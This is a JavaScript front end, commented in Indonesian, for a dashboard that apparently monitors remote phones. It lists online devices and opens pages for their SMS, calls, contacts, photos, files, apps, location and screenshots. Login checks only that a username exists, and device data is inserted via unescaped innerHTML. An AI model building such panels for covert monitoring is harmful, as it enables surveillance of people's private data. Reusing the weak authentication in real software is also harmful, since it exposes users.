
(function(){
  if(localStorage.theme === "light"){
    document.documentElement.classList.add("light");
  }
})();

const btn=document.getElementById("themeBtn");
function applyTheme(){
  btn.textContent=document.documentElement.classList.contains("light")?"☀️":"🌙";
  
}
applyTheme();
btn.onclick=()=>{
  document.documentElement.classList.toggle("light");
  localStorage.theme=document.documentElement.classList.contains("light")?"light":"dark";
  applyTheme();
};

function showLoader(text = "Memuat...") {
    const l = document.getElementById("loader");
    if (!l) return;

    const p = l.querySelector("p");
    if (p) p.textContent = text;

    l.style.display = "flex";
}

function hideLoader() {
    const l = document.getElementById("loader");
    if (!l) return;

    l.style.display = "none";
}


function openPage(pageId){

  document.getElementById('loader').style.display = 'flex';
  document.querySelectorAll('.page')
  .forEach(p => p.style.display = 'none');

  setTimeout(() => {

    document.getElementById('menuPage').style.display = 'none';

    document.querySelectorAll('.page').forEach(p => {
      p.style.display = 'none';
    });

    const activePage = document.getElementById(pageId);
    activePage.style.display = 'block';

    document.getElementById('loader').style.display = 'none';

    const breadcrumb = document.getElementById('breadcrumb');
    const breadcrumbArr = pageBreadcrumbMap[pageId] || [];

    if (breadcrumbArr.length > 0) {
      breadcrumb.style.display = 'flex';
      document.body.classList.add('breadcrumb-active');
    } else {
      breadcrumb.style.display = 'none';
      document.body.classList.remove('breadcrumb-active');
    }

    if (breadcrumbArr.length > 0) {
      breadcrumb.innerHTML = '';

      breadcrumbArr.forEach((name, index) => {
        if (index < breadcrumbArr.length - 1) {
          const span = document.createElement('span');
          span.textContent = name;
          span.className = 'breadcrumb-link';
          span.onclick = () => goToBreadcrumb(index, breadcrumbArr);
          breadcrumb.appendChild(span);

          const sep = document.createElement('span');
          sep.textContent = '/';
          sep.className = 'breadcrumb-separator';
          breadcrumb.appendChild(sep);
        } else {
          const span = document.createElement('span');
          span.textContent = name;
          breadcrumb.appendChild(span);
        }
      });

      breadcrumb.style.display = 'flex';
    } else {
      breadcrumb.style.display = 'none';
    }

    /* ===============================
       ⬇️ SATU-SATUNYA TAMBAHAN PENTING
       =============================== */
    requestAnimationFrame(() => {
      if (pageId === 'gallery') {
        rendergallery();
      }
      if (pageId === 'geofence') {
        iniFungsi();
      }
      if (pageId === 'kontak') {
        loadContactsBaru(currentUID);
      }
      if (pageId === 'panggilan') {
        loadCallBaru(currentUID);
      }
      if (pageId === 'sms') {
        loadSMSBaru(currentUID);
      }
      if (pageId === 'file') {
        loadFileList();
      }
      if (pageId === 'screenrecorder') {
        getlistvideorecord();
      }
      if (pageId === 'aplikasi') {
        loadAppsBaru();
      }

      if (pageId === 'screenshot') {
        loadScreenshotRealtime();
      }
    });

  }, 1000);
}

const pageBreadcrumbMap = {
  'menuPage': [],
  'gallery': ['Home','Gallery Foto'],
  'sms': ['Home','SMS'],
  'notifikasi': ['Home','Notifikasi Listener'],
  'file': ['Home','File Manager'],
  'panggilan': ['Home','Panggilan'],
  'aplikasi': ['Home','Aplikasi'],
  'geofence': ['Home','Geofence'],
  'kontak': ['Home','Kontak'],
  'screenshot': ['Home','Screenshot'],
  'screenrecorder': ['Home','Screen Recorder']
};

function goToBreadcrumb(level, breadcrumbArr){
  if(level === 0){
    openPage('menuPage');
  } else {
    const targetPageId = getPageIdFromBreadcrumb(breadcrumbArr[level]);
    if(targetPageId) openPage(targetPageId);
  }
}

const bindBtn = document.querySelector('.bind-btn');

bindBtn.addEventListener("click", (e) => {
  e.stopPropagation();
  deviceDropdown.style.display =
    deviceDropdown.style.display === "block" ? "none" : "block";
});

const dropdownToggle = document.getElementById("dropdownToggle");
const deviceDropdown = document.getElementById("deviceDropdown");

dropdownToggle.addEventListener("click", (e) => {
  e.stopPropagation();
  deviceDropdown.style.display =
    deviceDropdown.style.display === "block" ? "none" : "block";
});

deviceDropdown.addEventListener("click", (e) => {
  e.stopPropagation();
});

document.addEventListener("click", () => {
  deviceDropdown.style.display = "none";
});

const accountBtn = document.getElementById('profBtn');
const accountDropdown = document.getElementById('accountDropdown');

accountBtn.addEventListener('click', e => {
  e.stopPropagation();
  accountDropdown.classList.toggle('active');
});

accountDropdown.addEventListener('click', e => {
  e.stopPropagation();
});

document.addEventListener('click', () => {
  accountDropdown.classList.remove('active');
});
function loadDevices(){
  const username = localStorage.getItem("loginUser");
  if(!username) return;

  const ref = firebase
    .database()
    .ref(`/online/${username}`);

  ref.on("value", (snap) => {
    const list = document.getElementById("deviceList");
    list.innerHTML = "";

    if(!snap.exists()){
      list.innerHTML = "<div class='sub-text'>No online device</div>";
      return;
    }

    Object.values(snap.val()).forEach(v => {
      if(!v.device) return;

      const dev = v.device;

      const item = document.createElement("div");
      item.className = "item";
      item.innerHTML = `
        <div class="icon">📱</div>
        <div class="content">
          <div class="title">${dev.phone}</div>
          <div class="sub-text">Battery ${dev.battery}%</div>
        </div>
      `;

      item.onclick = () => {
        selectDevice(dev.id, dev.phone, dev.battery);
      };

      list.appendChild(item);
    });
  });
}



function selectDevice(uid, name, battery){
  currentUID = uid;

  deviceName.textContent = truncateName(name, 14);
  batteryText.textContent = battery || "–%";
  deviceDropdown.style.display = "none";
  showLoader("Memuat halaman...");

  openPage('menuPage');

  setTimeout(() => {
    hideLoader();
  }, 1000);

  // LOAD DATA SESUAI DEVICE bisa ditaruh di sini
  loadMap();
  loadSMSBaru(currentUID);
  loadCallBaru(currentUID);
  loadContactsBaru(currentUID);
  loadAppUsage(currentUID);
  devinfo(currentUID);
  loadDeviceInfo(currentUID);
  
  
}

function truncateName(name, max){
  if(!name) return "Unknown";
  return name.length > max ? name.slice(0,max)+"…" : name;
}


function showToast(){
  document.querySelector(".toast")?.remove();

  const toast=document.createElement("div");
  toast.className="toast";
  toast.innerHTML=`
    <div class="toast-body">
      <!-- INLINE SVG = NO DELAY -->
      <svg class="toast-icon" viewBox="0 0 24 24" fill="none"
           stroke="#22c55e" stroke-width="3"
           stroke-linecap="round" stroke-linejoin="round">
        <polyline points="20 6 9 17 4 12"></polyline>
      </svg>

      <div class="toast-text">Screenshot di panggil</div>
    </div>
    <div class="toast-bar"></div>
  `;

  const duration=7000; // 7 detik FIX
  toast.querySelector(".toast-bar")
       .style.animationDuration=`${duration}ms`;

  document.body.appendChild(toast);

  setTimeout(()=>{
    toast.style.animation="slideOut .4s ease forwards";
    setTimeout(()=>toast.remove(),400);
  },duration);
}

function toggleAccount(){
  document
    .getElementById("accountDropdown")
    .classList.toggle("active");
}

/* LOAD USER NAME */
document.addEventListener("DOMContentLoaded", ()=>{
  const name = localStorage.getItem("username") || "Demo User";
  document.getElementById("accountUserName").innerText = name;
});

/* THEME */
function setTheme(mode){
  if(mode === "system"){
    document.documentElement.classList.remove("light");
    localStorage.removeItem("theme");
    return;
  }

  document.documentElement.classList.toggle("light", mode === "light");
  localStorage.theme = mode;
}

/* LOGOUT */
function logoutAccount(){
  localStorage.removeItem("username");

  // kalau pakai firebase online status
  if(window.onlineRef){
    onlineRef.remove();
  }

  location.reload();
}





let currentOwner = null;

function showApp(){
  document.getElementById("loginPage").style.display = "none";
  document.getElementById("app").style.display = "block";
}

function showLogin(){
  document.getElementById("loginPage").style.display = "flex";
  document.getElementById("app").style.display = "none";
}

// LOGIN BUTTON
// LOGIN BUTTON
function login() {
  const username = document.getElementById("loginName").value.trim();
  const errorEl = document.getElementById("loginError");
  errorEl.innerText = ""; // reset pesan error

  if (!username) {
    errorEl.innerText = "Isi username";
    return;
  }

  firebase.database().ref("/online/" + username)
    .once("value")
    .then(snap => {
      if (!snap.exists()) {
        errorEl.innerText = "Username tidak terdaftar";
        return;
      }

      // SIMPAN LOGIN
      localStorage.setItem("loginUser", username);
      currentOwner = username;

      // SET NAMA DI DROPDOWN
      setAccountUserName(username);

      // TAMPILKAN APP
      showApp();
      loadDevices();
    });
}

// AUTO LOGIN SAAT REFRESH
function checkLogin(){
  const saved = localStorage.getItem("loginUser");

  if(!saved){
    hideAuthGate();
    showLogin();
    return;
  }

  firebase.database().ref("/online/" + saved)
    .once("value")
    .then(snap => {
      hideAuthGate();

      if(!snap.exists()){
        localStorage.removeItem("loginUser");
        showLogin();
        return;
      }

      currentOwner = saved;
      setAccountUserName(saved);
      showApp();
      loadDevices();
    })
    .catch(() => {
      hideAuthGate();
      showLogin();
    });
}

// LOGOUT
function logoutAccount(){
  localStorage.removeItem("loginUser");
  currentOwner = null;

  // reset UI
  document.getElementById("loginName").value = "";

  showLogin();
}

document.addEventListener("DOMContentLoaded", checkLogin);


function setAccountUserName(name){
  const el = document.getElementById("accountUserName");
  if(el) el.innerText = `Hallo ${name}`;
}
function hideAuthGate(){
  const gate = document.getElementById("authGate");
  if(gate) gate.style.display = "none";
}


function updateClock() {
  const now = new Date();

  // Jam + menit + detik
  const hours = String(now.getHours()).padStart(2, '0');
  const minutes = String(now.getMinutes()).padStart(2, '0');
  const seconds = String(now.getSeconds()).padStart(2, '0');

  document.getElementById("clockTime").innerText = `${hours}:${minutes}:${seconds}`;

  // Hari, tanggal
  const options = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
  document.getElementById("clockDate").innerText = now.toLocaleDateString('id-ID', options);
}

// Update setiap detik
setInterval(updateClock, 1000);
updateClock(); // langsung panggil supaya tidak delay 1 detik